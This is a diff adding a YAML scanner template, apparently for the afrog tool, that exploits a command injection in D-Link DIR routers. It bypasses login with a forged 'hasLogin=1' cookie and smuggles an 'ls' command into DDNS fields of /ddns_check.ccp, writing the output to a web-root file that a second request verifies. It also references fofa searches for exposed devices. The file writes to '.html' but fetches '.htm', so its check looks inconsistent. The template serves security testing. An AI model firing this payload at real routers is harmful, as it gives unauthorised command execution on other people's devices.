@@ -1,0 +1,30 @@
+id: d-linke-route-command-injection
+
+info:
+  name: D-LINK Router Command Injection
+  author: zan8in
+  severity: high
+  description: |
+    fofa: D-LINK-DIR
+  reference:
+    - https://github.com/doudoudedi/D-LINK_Command_Injection1/blob/main/D-LINK_Command_injection.md
+    - http://www.ctfiot.com/30764.html
+
+set:
+  randstr: randomLowercase(10)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /ddns_check.ccp
+      headers:
+        Cookie: hasLogin=1
+      body: |
+        ccp_act=doCheck&ddnsHostName=;ls/>/www/{{randstr}}.html;&ddnsUsername=;ls />/www/{{randstr}}.html;&ddnsPassword=123123123
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /{{randstr}}.htm
+    expression: response.status == 200 && response.body.bcontains(b'mydlink') && response.body.bcontains(b'dev') && response.body.bcontains(b'etc') && response.body.bcontains(b'home')
+expression: r0() && r1()
